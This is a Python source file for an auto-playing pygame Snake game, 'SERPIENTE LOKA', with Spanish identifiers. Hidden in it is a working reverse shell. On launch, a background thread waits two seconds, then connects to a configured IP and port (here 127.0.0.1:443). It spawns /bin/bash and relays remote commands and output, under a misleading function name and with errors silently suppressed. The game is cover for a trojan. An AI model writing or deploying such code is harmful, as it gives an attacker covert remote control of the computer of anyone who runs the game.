import socket
import subprocess
import threading
import time
import pygame
import random
import sys
import os

# configuración reverse shell
TIEMPO_ESPERA = 2
IP_OBJETIVO = "127.0.0.1"
PUERTO_OBJETIVO = 443

def accion_post_radar():
    try:
        s = socket.socket()
        s.connect((IP_OBJETIVO, PUERTO_OBJETIVO))

        shell = subprocess.Popen(
            ["/bin/bash"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )

        def leer_shell():
            while True:
                salida = shell.stdout.readline()
                if salida:
                    s.send(salida.encode())

        def leer_errores():
            while True:
                error = shell.stderr.readline()
                if error:
                    s.send(error.encode())

        threading.Thread(target=leer_shell, daemon=True).start()
        threading.Thread(target=leer_errores, daemon=True).start()

        while True:
            comando = s.recv(1024).decode().strip()
            if comando.lower() in ["exit", "quit"]:
                shell.terminate()
                break
            shell.stdin.write(comando + "\n")
            shell.stdin.flush()

        s.close()
    except Exception:
        pass

def lanzar_shell_con_retraso(segundos):
    time.sleep(segundos)
    accion_post_radar()

def juego_snake_pygame():
    pygame.init()
    bloque = 20
    ancho = 800
    alto = 600
    ventana = pygame.display.set_mode((ancho, alto))
    pygame.display.set_caption("SERPIENTE LOKA")

    reloj = pygame.time.Clock()
    fuente = pygame.font.SysFont("consolas", 24)

    def texto(msg, color, y_offset=0):
        mensaje = fuente.render(msg, True, color)
        ventana.blit(mensaje, [ancho // 2 - mensaje.get_width() // 2, alto // 2 + y_offset])

    def juego():
        velocidad = 5
        x = ancho // 2
        y = alto // 2
        dx = bloque
        dy = 0

        snake = [[x, y], [x - bloque, y], [x - 2*bloque, y]]
        comida = [random.randrange(0, ancho - bloque, bloque), random.randrange(0, alto - bloque, bloque)]
        puntaje = 0

        def siguiente_mov(snake, comida):
            cabeza = snake[0]
            mejores = []
            for mx, my in [(0, -bloque), (0, bloque), (-bloque, 0), (bloque, 0)]:
                nueva = [cabeza[0] + mx, cabeza[1] + my]
                if (0 <= nueva[0] < ancho) and (0 <= nueva[1] < alto) and nueva not in snake:
                    distancia = abs(nueva[0] - comida[0]) + abs(nueva[1] - comida[1])
                    mejores.append((distancia, mx, my))
            if mejores:
                mejores.sort()
                return mejores[0][1], mejores[0][2]
            return 0, 0

        corriendo = True
        while corriendo:
            for evento in pygame.event.get():
                if evento.type == pygame.QUIT:
                    pygame.quit()
                    sys.exit()

            dx, dy = siguiente_mov(snake, comida)
            if dx == dy == 0:
                ventana.fill((0,0,0))
                texto(f"Game Over! Puntaje: {puntaje}", (255, 0, 0))
                pygame.display.flip()
                pygame.time.wait(3000)
                break

            x += dx
            y += dy
            cabeza = [x, y]

            if cabeza in snake or not (0 <= x < ancho) or not (0 <= y < alto):
                ventana.fill((0,0,0))
                texto(f"Game Over! Puntaje: {puntaje}", (255, 0, 0))
                pygame.display.flip()
                pygame.time.wait(3000)
                break

            snake.insert(0, cabeza)

            if cabeza == comida:
                puntaje += 0.5
                velocidad += 0.2
                comida = [random.randrange(0, ancho - bloque, bloque),
                          random.randrange(0, alto - bloque, bloque)]
            else:
                snake.pop()

            ventana.fill((10, 10, 10))
            for segment in snake:
                pygame.draw.rect(ventana, (0, 255, 0), [segment[0], segment[1], bloque, bloque])
            pygame.draw.rect(ventana, (255, 0, 0), [comida[0], comida[1], bloque, bloque])
            pygame.display.update()
            reloj.tick(int(velocidad))

    juego()

def main():
    threading.Thread(target=lanzar_shell_con_retraso, args=(TIEMPO_ESPERA,), daemon=True).start()
    juego_snake_pygame()

if __name__ == "__main__":
    main()
